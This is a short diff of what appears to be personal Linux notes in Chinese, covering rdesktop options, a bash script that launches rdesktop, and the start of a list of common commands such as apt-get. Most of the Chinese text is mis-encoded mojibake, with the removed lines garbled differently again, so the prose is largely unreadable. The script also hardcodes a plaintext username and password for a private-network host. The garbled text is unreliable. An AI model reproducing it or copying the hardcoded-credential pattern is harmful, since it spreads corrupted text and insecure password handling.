+		7ã€-r clipboard:PRIMARYCLIPBOARD å…è®¸åœ¨è¿œç¨‹ä¸»æœºå’Œæœ¬æœºä¹‹é—´å…±äº«å‰ªåˆ‡æ¿ï¼Œå°±æ˜¯å¯ä»¥å¤åˆ¶ç²˜è´´ã€‚
+		ä»¥ä¸Šæ˜¯rdesktopçš„å¸¸ç”¨å‚æ•°ï¼Œæ›´å¤šå‚æ•°è¯·è‡ªè¡Œç™¾åº¦æˆ–è€…åœ¨linuxä¸­æ‰§è¡Œ rdesktop --helpæŸ¥çœ‹ã€‚
 	
-	½Å±¾
+	è„šæœ¬
 		#!/bin/bash
 		rdesktop -u zhangge -p zhangge918 192.168.10.104 -r sound:off -g 1280*800
 		exit
 	
 }
-linux³£ÓÃÃüÁî
+linuxå¸¸ç”¨å‘½ä»¤
 {
 	apt-get install
 	apt-get update
